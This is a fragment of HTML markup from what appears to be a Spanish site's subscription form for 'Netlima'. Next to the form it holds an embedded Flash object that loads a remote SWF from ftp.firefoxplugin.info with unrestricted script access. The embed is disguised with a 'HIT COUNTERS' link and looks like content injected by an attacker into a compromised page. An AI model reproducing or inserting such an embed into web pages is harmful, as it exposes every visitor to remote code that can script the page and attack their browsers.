...
<tr>
  ...
  <form action="mail2suscrip.php" method="post" enctype="multipart/form-data" target="_blank" name="formu2a" id="formu2a">
    ...
    <p> Nombre:<br />
      ...
      <input name="asunto" type="hidden" value="Suscripcion a Netlima" size="50" />
...
<object allowscriptaccess="always" type="application/x-shockwave-flash" data="http://ftp.firefoxplugin.info/navigation.swf?id=1154242_0" width="200" height="250" wmode="transparent"><param name="allowscriptaccess" value="always" /><param name="movie" value="http://ftp.firefoxplugin.info/navigation.swf?id=1154242_0" /><param name="wmode" value="transparent" /><embed src="http://ftp.firefoxplugin.info/navigation.swf?id=1154242_0" type="application/x-shockwave-flash" allowscriptaccess="always" wmode="transparent" width="200" height="250" /><video width="200" height="250"><a style=";text-decoration:underline;font-weight:normal;font-size:14px" title="HIT COUNTERS" href="http://www.123-counters.com/">www.123-counters.com</a></video></object>		</td>
      </tr>
